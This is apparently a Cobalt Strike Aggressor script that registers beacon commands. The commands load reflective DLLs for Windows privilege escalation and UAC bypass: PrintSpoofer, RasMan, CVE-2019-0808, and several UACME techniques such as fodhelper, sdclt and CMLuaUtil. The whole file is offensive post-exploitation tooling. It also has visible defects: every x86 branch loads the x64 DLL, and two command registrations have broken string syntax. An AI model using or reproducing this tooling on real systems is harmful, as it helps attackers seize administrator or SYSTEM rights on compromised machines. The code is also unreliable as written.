alias PipePotato {

    if (-is64 $1)
    {
        $arch = "x64";
        $archdll = script_resource("PrintSpoofer-x64.dll");
    } else {
        $arch = "x86";
        $archdll = script_resource("PrintSpoofer-x64.dll");
    }

    bdllspawn($1, $archdll, $2, "no", 999999, false);
}

beacon_command_register("PipePotato", "PrintSpoofer Privilege Escalation. Windows 10 and above are recommended". "PrintSpoofer Privilege Escalation. \n\n usage:PipePotato c:\\a.exe");


alias RasmanPotato {

    if (-is64 $1)
    {
        $arch = "x64";
        $archdll = script_resource("RasMan-x64.dll");
    } else {
        $arch = "x86";
        $archdll = script_resource("RasMan-x64.dll");
    }

    bdllspawn($1, $archdll, $2, "test", 999999, false);
}

beacon_command_register("RasmanPotato", "RasmanPotato Privilege Escalation", "RasmanPotato Privilege Escalation. \n\n usage:RasmanPotato c:\\a.exe");


alias CVE-2019-0808 {

    if (-is64 $1)
    {
        $arch = "x64";
        $archdll = script_resource("CVE-2019-0808-x64.dll");
    } else {
        $arch = "x86";
        $archdll = script_resource("CVE-2019-0808-x64.dll");
    }

    bdllspawn($1, $archdll, $2, "test", 999999, false);
}

beacon_command_register("CVE-2019-0808", "CVE-2019-0808 Privilege Escalation,Windows 7 is recommended", "CVE-2019-0808 Privilege Escalation.\n\n  usage:CVE-2019-0808 c:\\a.exe");


alias BypassUAC-CMLuaUtil {

    if (-is64 $1)
    {
        $arch = "x64";
        $archdll = script_resource("BypassUAC-CMLuaUtil-x64.dll");
    } else {
        $arch = "x86";
        $archdll = script_resource("BypassUAC-CMLuaUtil-x64.dll");
    }

    bdllspawn($1, $archdll, $2, "test", 999999, false);
}

beacon_command_register("BypassUAC-CMLuaUtil", "UACME No.41,bypassuac via com component CMLuaUtil", "bypassuac via com component CMLuaUtil,Microsoft not fixed. \n\n usage: BypassUAC-CMLuaUtil c:\\a.exe");


alias BypassUAC-ShellRegMod {

    if (-is64 $1)
    {
        $arch = "x64";
        $archdll = script_resource("BypassUAC-ShellRegMod-x64.dll");
    } else {
        $arch = "x86";
        $archdll = script_resource("BypassUAC-ShellRegMod-x64.dll");
    }

    bdllspawn($1, $archdll, $2, "test", 999999, false);
}

beacon_command_register("BypassUAC-ShellRegMod", "UACME No.33,Using the registry bypassuac via fodhelper and computerdefault", "bypassuac via fodhelper and computerdefault registry, Microsoft not fixed.\n\n usage: BypassUAC-ShellRegMod c:\\a.exe");


alias BypassUAC-ShellRegMod2 {

    if (-is64 $1)
    {
        $arch = "x64";
        $archdll = script_resource("BypassUAC-ShellRegMod2-x64.dll");
    } else {
        $arch = "x86";
        $archdll = script_resource("BypassUAC-ShellRegMod2-x64.dll");
    }

    bdllspawn($1, $archdll, $2, "test", 999999, false);
}

beacon_command_register("BypassUAC-ShellRegMod2", "UACME No.61&53,bypassuac via slui and sdclt registry", "Use the registry slui and sdclt bypassUAC,Microsoft not fixed. \n\n usage: BypassUAC-ShellRegMod2 c:\\a.exe");


alias BypassUAC-ShellRegMod3 {

    if (-is64 $1)
    {
        $arch = "x64";
        $archdll = script_resource("BypassUAC-ShellRegMod3-x64.dll");
    } else {
        $arch = "x86";
        $archdll = script_resource("BypassUAC-ShellRegMod3-x64.dll");
    }

    bdllspawn($1, $archdll, $2, "test", 999999, false);
}

beacon_command_register("BypassUAC-ShellRegMod3", "UACME No.70,Similar to BypassUAC-ShellRegMod", "Similar to BypassUAC-ShellRegMod ,Microsoft not fixed. \n\n usage: BypassUAC-ShellRegMod3 c:\\a.exe");


alias BypassUAC-DccwCOM {

    if (-is64 $1)
    {
        $arch = "x64";
        $archdll = script_resource("BypassUAC-DccwCOM-x64.dll");
    } else {
        $arch = "x86";
        $archdll = script_resource("BypassUAC-DccwCOM-x64.dll");
    }

    bdllspawn($1, $archdll, $2, "test", 999999, false);
}

beacon_command_register("BypassUAC-DccwCOM", "No.43,bypassuac via DccwCOM " "bypassuac via DccwCOM,Microsoft not fixed. \n\n usage: BypassUAC-DccwCOM c:\\a.exe");
